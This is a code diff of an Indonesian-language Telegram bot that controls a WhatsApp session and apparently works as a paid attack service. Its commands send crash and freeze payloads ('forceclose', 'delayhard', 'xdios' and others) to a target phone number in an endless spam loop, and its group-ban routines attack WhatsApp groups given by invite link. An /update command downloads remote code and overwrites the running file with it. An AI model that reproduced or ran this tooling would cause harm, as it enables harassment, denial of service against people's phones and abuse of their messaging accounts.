+        else if (banName === "endgbv2") await BanGroup(sock, inviteCode);
+        await ctx.reply("✅ Ban group selesai!");
+      } catch (e) {
+        console.error("ban gb err:", e.message);
+        await ctx.reply(`❌ Gagal: ${e.message}`);
+      }
+    });
+    return;
+  }
+
+  // PENDING BUG
+  if (!pendingBugUser.has(userId)) return next();
+  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
+
+  const parts = text.trim().split(/\s+/);
+  if (parts.length !== 1) return next();
+
+  const rawNumber = parts[0];
+  const target = formatTarget(rawNumber);
+  if (!target) return ctx.reply("❌ Nomor gak valid. Contoh: <code>628xxxxxxxx</code>", { parse_mode: "HTML" });
+
+  const bugName = pendingBugUser.get(userId);
+  pendingBugUser.delete(userId);
+
+  const label = {
+    forceclose: "Forceclose", delayhard: "Delayhard",
+    ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios",
+  }[bugName] || bugName;
+
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
+  const tasks = getBugTasks(bugName, target);
+  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
+
+  spamForever(ctx, label, target, tasks);
+});
+
+// =================== GET BUG TASKS ===================
 function getBugTasks(bugName, target) {
   switch (bugName) {
     case "forceclose":
@@ -1091,10 +1424,6 @@ function getBugTasks(bugName, target) {
         { name: "StuckNewAmba",  fn: () => StuckNewAmba(sock, target)  },
       ];
     case "delayhard":
-      return [
-        { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
-        { name: "StuckNewAmba", fn: () => StuckNewAmba(sock, target) },
-      ];
     case "ghost":
       return [
         { name: "StuckLogo",    fn: () => StuckLogo(sock, target)    },
@@ -1118,305 +1447,50 @@ function getBugTasks(bugName, target) {
   }
 }
 
-// =================== NANGKEP INPUT (bug pick + ban pick) ===================
-bot.on("text", async (ctx, next) => {
-  const userId = ctx.from.id;
-  const text   = ctx.message?.text || "";
-
-  // ============ PENDING BAN ============
-  if (pendingBanUser.has(userId)) {
-    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }
-
-    const targetInput = text.trim();
-    if (!targetInput.includes("chat.whatsapp.com/")) {
-      return ctx.reply("❌ Link gak valid. Kirim link WhatsApp, contoh:\n<code>https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });
-    }
-
-    const banName = pendingBanUser.get(userId);
-    pendingBanUser.delete(userId);
-
-    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
-
-    await ctx.reply("Succes Banned Group", {
-      reply_markup: {
-        inline_keyboard: [[
-          {
-            text: "Details Target",
-            url: `https://chat.whatsapp.com/${inviteCode}`,
-            icon_custom_emoji_id: "5395444784611480792",
-            style: "success",
-          },
-        ]],
-      },
-    });
-
-    console.log("\x1b[32m[PROSES BAN GROUP]\x1b[0m TUNGGU HINGGA SELESAI");
-
-    queue.add(async () => {
-      try {
-        if (banName === "endgb") {
-          await proxzy(sock, inviteCode);
-        } else if (banName === "endgbv2") {
-          await BanGroup(sock, inviteCode);
-        }
-        console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group selesai! 🚀");
-        await ctx.reply("✅ Ban group selesai!");
-      } catch (e) {
-        console.error("ban gb err:", e.message);
-        await ctx.reply(`❌ Gagal: ${e.message}`);
-      }
-    });
-    return;
-  }
-
-  // ============ PENDING BUG ============
-  if (!pendingBugUser.has(userId)) return next();
-  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
-
-  const parts = text.trim().split(/\s+/);
-  if (parts.length !== 1) return next();
-
-  const rawNumber = parts[0];
-  const target    = formatTarget(rawNumber);
-
-  if (!target) return ctx.reply("❌ Nomor gak valid. Kirim ulang, contoh: <code>628xxxxxxxx</code>", { parse_mode: "HTML" });
-
-  const bugName = pendingBugUser.get(userId);
-  pendingBugUser.delete(userId);
-
-  const label = {
-    forceclose: "Forceclose",
-    delayhard:  "Delayhard",
-    ghost:      "Ghost",
-    forcezz:    "Forcezz",
-    xdios:      "Xdios",
-  }[bugName] || bugName;
-
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const tasks = getBugTasks(bugName, target);
-  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
-
-  spamForever(ctx, label, target, tasks);
-});
-
 // =================== /stopbug ===================
 bot.command("stopbug", async (ctx) => {
   const userId = ctx.from.id.toString();
   let count = 0;
-
   for (const [jobId, state] of activeSpam.entries()) {
-    if (state.userId === userId) {
-      state.stop = true;
-      count++;
-    }
+    if (state.userId === userId) { state.stop = true; count++; }
   }
-
   if (count === 0) return ctx.reply("📌 Gak ada spam yang jalan.");
-  return ctx.reply(`🛑 ${count} spam akan dihentikan...`);
-});
-
-// =================== SETTING MENU ===================
-bot.action("/setting_menu", async (ctx) => {
-  await ctx.answerCbQuery();
-  const msgId = ctx.callbackQuery.message.message_id;
-
-  const html = `
-<h2>☰ SYSTEM CONTROL PANEL</h2>
-<p><i>(Page 2/4) • 𝙷𝙴𝙵𝙰𝙸𝚂𝚃𝙾𝚂 𝙷𝙰𝙳𝙴𝚂</i></p>
-<img src="${thumbnailUrl}" alt="banner"/>
-<hr/>
-<h3>☰ Connect Bot / Update</h3>
-<ul>
-  <li>/addpairing  → Add Sender</li>
-  <li>/killsession → Delete Sender</li>
-  <li>/update      → Auto Update</li>
-</ul>
-<h3>☰ Owners Settings</h3>
-<ul>
-  <li>/addpremgrup  → Add All Member</li>
-  <li>/delpremgrup  → Remove All Member</li>
-  <li>/listpremgrup → List Group</li>
-</ul>
-<h3>☰ Menu Lain</h3>
-<ul>
-  <li>Bug Menu (list command)</li>
-  <li>Bug Pilih (tombol interaktif)</li>
-  <li>Ban Group (tombol interaktif)</li>
-</ul>
-<hr/>
-<p>Security Mode : <b>ACTIVE</b></p>
-<p>Network       : <b>Hefaistos Hades Core</b></p>
-`.trim();
-
-  try {
-    await ctx.telegram.callApi("editMessageText", {
-      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html }, reply_markup: { inline_keyboard: SETTING_KEYBOARD },
-    });
-  } catch (err) { console.log("setting_menu gagal:", err?.response?.description || err.message); }
+  return ctx.reply(`🛑 ${count} spam bakal dihentikan...`);
 });
 
 // =================== COMMAND MANUAL BUG ===================
-bot.command("delayhard", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+function manualBugCommand(cmd, bugKey, label) {
+  bot.command(cmd, premGroupOnly(), async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
 
-  const args = ctx.message.text.split(" ");
-  if (!args[1]) return ctx.reply("📌 Format: /delayhard 628xxxx");
-  const target = formatTarget(args[1]);
-  if (!target) return ctx.reply("❌ Nomor tidak valid...");
+    const args = ctx.message.text.split(" ");
+    if (!args[1]) return ctx.reply(`📌 Format: /${cmd} 628xxxx`);
+    const target = formatTarget(args[1]);
+    if (!target) return ctx.reply("❌ Nomor tidak valid...");
 
-  const tasks = getBugTasks("delayhard", target);
-  spamForever(ctx, "delayhard", target, tasks);
-});
-
-bot.command("ghost", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const args = ctx.message.text.split(" ");
-  if (!args[1]) return ctx.reply("📌 Format: /ghost 628xxxx");
-  const target = formatTarget(args[1]);
-  if (!target) return ctx.reply("❌ Nomor tidak valid...");
-
-  const tasks = getBugTasks("ghost", target);
-  spamForever(ctx, "ghost", target, tasks);
-});
-
-bot.command("forceclose", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const args = ctx.message.text.split(" ");
-  if (!args[1]) return ctx.reply("📌 Format: /forceclose 628xxxx");
-  const target = formatTarget(args[1]);
-  if (!target) return ctx.reply("❌ Nomor tidak valid...");
-
-  const tasks = getBugTasks("forceclose", target);
-  spamForever(ctx, "forceclose", target, tasks);
-});
-
-bot.command("forcezz", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const args = ctx.message.text.split(" ");
-  if (!args[1]) return ctx.reply("📌 Format: /forcezz 628xxxx");
-  const target = formatTarget(args[1]);
-  if (!target) return ctx.reply("❌ Nomor tidak valid...");
-
-  const tasks = getBugTasks("forcezz", target);
-  spamForever(ctx, "forcezz", target, tasks);
-});
-
-bot.command("xdios", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const args = ctx.message.text.split(" ");
-  if (!args[1]) return ctx.reply("📌 Format: /xdios 628xxxx");
-  const target = formatTarget(args[1]);
-  if (!target) return ctx.reply("❌ Nomor tidak valid...");
-
-  const tasks = getBugTasks("xdios", target);
-  spamForever(ctx, "xdios", target, tasks);
-});
-
-// =================== /endgbv1 ===================
-bot.command("endgbv1", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
-  if (!targetInput) return ctx.reply("📌 Format: /endgbv1 https://chat.whatsapp.com/xxxxx");
-  if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid. Contoh:\n<code>/endgbv1 https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });
-
-  const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
-
-  await ctx.reply("Succes Banned Group", {
-    reply_markup: {
-      inline_keyboard: [[
-        {
-          text: "Details Target",
-          url: `https://chat.whatsapp.com/${inviteCode}`,
-          icon_custom_emoji_id: "5395444784611480792",
-          style: "success",
-        },
-      ]],
-    },
+    const tasks = getBugTasks(bugKey, target);
+    spamForever(ctx, label, target, tasks);
   });
+}
+manualBugCommand("delayhard",  "delayhard",  "delayhard");
+manualBugCommand("ghost",      "ghost",      "ghost");
+manualBugCommand("forceclose", "forceclose", "forceclose");
+manualBugCommand("forcezz",    "forcezz",    "forcezz");
+manualBugCommand("xdios",      "xdios",      "xdios");
 
-  console.log("\x1b[32m[PROSES BAN GROUP v1]\x1b[0m TUNGGU HINGGA SELESAI");
-
-  queue.add(async () => {
-    try {
-      await proxzy(sock, inviteCode);
-      console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group v1 selesai! 🚀");
-      await ctx.reply("✅ Ban group v1 selesai!");
-    } catch (e) {
-      console.error("endgbv1 err:", e.message);
-      await ctx.reply(`❌ Gagal: ${e.message}`);
-    }
-  });
-});
-
-// =================== /endgbv2 ===================
-bot.command("endgbv2", premGroupOnly(), async (ctx) => {
-  const userId = ctx.from.id.toString();
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
-
-  const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
-  if (!targetInput) return ctx.reply("📌 Format: /endgbv2 https://chat.whatsapp.com/xxxxx");
-  if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid. Contoh:\n<code>/endgbv2 https://chat.whatsapp.com/xxxxx</code>", { parse_mode: "HTML" });
-
-  const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
-
-  await ctx.reply("Succes Banned Group", {
-    reply_markup: {
-      inline_keyboard: [[
-        {
-          text: "Details Target",
-          url: `https://chat.whatsapp.com/${inviteCode}`,
-          icon_custom_emoji_id: "5395444784611480792",
-          style: "success",
-        },
-      ]],
-    },
-  });
-
-  console.log("\x1b[32m[PROSES BAN GROUP v2]\x1b[0m TUNGGU HINGGA SELESAI");
-
-  queue.add(async () => {
-    try {
-      await BanGroup(sock, inviteCode);
-      console.log("\x1b[32m[SUCCESS]\x1b[0m Ban group v2 selesai! 🚀");
-      await ctx.reply("✅ Ban group v2 selesai!");
-    } catch (e) {
-      console.error("endgbv2 err:", e.message);
-      await ctx.reply(`❌ Gagal: ${e.message}`);
-    }
-  });
-});
-
-// =================== CRASH BUG (/bug) ===================
-const clickedUsers = {};
-
+// =================== /bug (CRASH BUG) ===================
 bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("🪧 Example : /bug 62xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const theme = getTheme(ctx.from.id);
+
+  if (theme === "poll") {
+    return renderCrashBugPoll(ctx, q, target);
+  }
 
   await ctx.replyWithPhoto(
     { source: "./image/MagicClowerd.jpg" },
@@ -1445,9 +1519,11 @@ bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, asyn
   );
 });
 
+const clickedUsers = {};
+
 bot.on("callback_query", async (ctx) => {
   const userId = ctx.from.id;
-  const data   = ctx.callbackQuery.data;
+  const data = ctx.callbackQuery.data;
 
   if (!/^(delay|blank|bulldozer|fc)_/.test(data)) return;
 
@@ -1456,62 +1532,83 @@ bot.on("callback_query", async (ctx) => {
   if (clickedUsers[userId]) {
     return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
   }
-
   clickedUsers[userId] = true;
 
   await ctx.answerCbQuery();
   await ctx.deleteMessage().catch(() => {});
 
   const methods = {
-    delay: {
-      name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒",
-      tasks: [
-        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
-        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
-        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
-        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
-      ],
-    },
-    blank: {
-      name: "XDioS",
-      tasks: [
-        { name: "catchingOs", fn: () => catchingOs(target)       },
-        { name: "iosswipper", fn: () => iosswipper(sock, target) },
-      ],
-    },
-    bulldozer: {
-      name: "Force Freez",
-      tasks: [
-        { name: "VIDEO-1",        fn: () => ForcloseVIDEO(sock, target) },
-        { name: "DOC-1",          fn: () => ForcloseDOC(sock, target)   },
-        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target)  },
-        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)     },
-        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target)  },
-        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)     },
-        { name: "STC-1",          fn: () => ForcloseSTC(sock, target)   },
-        { name: "VIDEO-2",        fn: () => ForcloseVIDEO(sock, target) },
-      ],
-    },
-    fc: {
-      name: "Force close",
-      tasks: [
-        { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
-        { name: "DOC-1",   fn: () => ForcloseDOC(sock, target)   },
-        { name: "STC-1",   fn: () => ForcloseSTC(sock, target)   },
-        { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
-      ],
-    },
+    delay: { name: "Delay Brutality", tasks: [
+      { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
+      { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
+      { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
+      { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
+    ]},
+    blank: { name: "XDioS", tasks: [
+      { name: "catchingOs", fn: () => catchingOs(target)       },
+      { name: "iosswipper", fn: () => iosswipper(sock, target) },
+    ]},
+    bulldozer: { name: "Force Freez", tasks: [
+      { name: "VIDEO-1",        fn: () => ForcloseVIDEO(sock, target) },
+      { name: "DOC-1",          fn: () => ForcloseDOC(sock, target)   },
+      { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target)  },
+      { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)     },
+      { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target)  },
+      { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)     },
+      { name: "STC-1",          fn: () => ForcloseSTC(sock, target)   },
+      { name: "VIDEO-2",        fn: () => ForcloseVIDEO(sock, target) },
+    ]},
+    fc: { name: "Force close", tasks: [
+      { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
+      { name: "DOC-1",   fn: () => ForcloseDOC(sock, target)   },
+      { name: "STC-1",   fn: () => ForcloseSTC(sock, target)   },
+      { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
+    ]},
   };
 
-  const method = methods[key];
-  if (!method) return;
+  const m = methods[key];
+  if (!m) return;
 
   if (!isPremiumUser(userId) && ctx.chat.type === "private") {
     return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
   }
 
-  spamForever(ctx, method.name, target, method.tasks);
+  spamForever(ctx, m.name, target, m.tasks);
 });
+
+// =================== BAN MANUAL ===================
+function banManual(cmd, banKey, label) {
+  bot.command(cmd, premGroupOnly(), async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus user premium atau grup premium.");
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+
+    const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
+    if (!targetInput) return ctx.reply(`📌 Format: /${cmd} https://chat.whatsapp.com/xxxxx`);
+    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.", { parse_mode: "HTML" });
+
+    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
+
+    await ctx.reply("✅ Masuk antrian ban", {
+      reply_markup: { inline_keyboard: [[
+        { text: "Lihat Target", url: `https://chat.whatsapp.com/${inviteCode}`, icon_custom_emoji_id: "5395444784611480792", style: "success" },
+      ]] },
+    });
+
+    queue.add(async () => {
+      try {
+        if (banKey === "endgb") await proxzy(sock, inviteCode);
+        else if (banKey === "endgbv2") await BanGroup(sock, inviteCode);
+        await ctx.reply(`✅ ${label} selesai!`);
+      } catch (e) {
+        console.error(`${cmd} err:`, e.message);
+        await ctx.reply(`❌ Gagal: ${e.message}`);
+      }
+    });
+  });
+}
+banManual("endgbv1", "endgb",   "End GB v1");
+banManual("endgbv2", "endgbv2", "End GB v2");
 
 // =================== PAIRING ===================
 bot.command("addpairing", async (ctx) => {
@@ -1841,7 +1938,6 @@ const BACKUP_FILE_PATH = "./files.backup.js";
 
 bot.command("update", async (ctx) => {
   if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
-
   const chatId = ctx.chat.id;
 
   const sent = await ctx.telegram.sendMessage(chatId, `\`\`\`
@@ -1867,32 +1963,18 @@ Status: ${status}
   try {
     await updateProgress(20, "Preparing...");
     await sleep(500);
-
     await updateProgress(40, "Downloading...");
     const { data } = await axios.get(UPDATE_URL);
     if (!data) { await updateProgress(40, "❌ File is empty!"); return ctx.reply("❌ Update failed: File is empty!"); }
-
     await updateProgress(60, "Backing up...");
     await sleep(500);
     if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);
-
     await updateProgress(80, "Installing...");
     await sleep(500);
     fs.writeFileSync(UPDATE_FILE_PATH, data);
-
     await updateProgress(100, "Completed");
     await sleep(800);
-
-    await ctx.reply(`✅ **Update Successful!**
-
-━━━━━━━━━━━━━━━━━
-📦 Backup    : files.backup.js
-🔄 Status    : Restarting bot...
-⏱ Time      : ${new Date().toLocaleString("en-US")}
-━━━━━━━━━━━━━━━━━
-
-_Bot will restart in 2 seconds..._`, { parse_mode: "Markdown" });
-
+    await ctx.reply(`✅ **Update Successful!**\n\n📦 Backup : files.backup.js\n🔄 Status : Restarting...`, { parse_mode: "Markdown" });
     setTimeout(() => process.exit(), 2000);
   } catch (e) {
     console.error("Update Error:", e);
@@ -1921,7 +2003,6 @@ bot.on("my_chat_member", async (ctx) => {
 
     if (["member", "administrator"].includes(nw) && ["left", "kicked"].includes(old)) {
       if (isGroupApproved(chatId)) return;
-
       await ctx.telegram.sendMessage(chat.id, "⚠️ Bot belum di-approve owner.\nJika 10 menit gak di-approve, bot keluar otomatis.");
       await ctx.telegram.sendMessage(ownerID, `🚨 BOT DITAMBAHKAN KE GRUP BARU\n\nNama : ${title}\nID   : ${chatId}\n\nGunakan:\n/approved ${chatId}`);
 
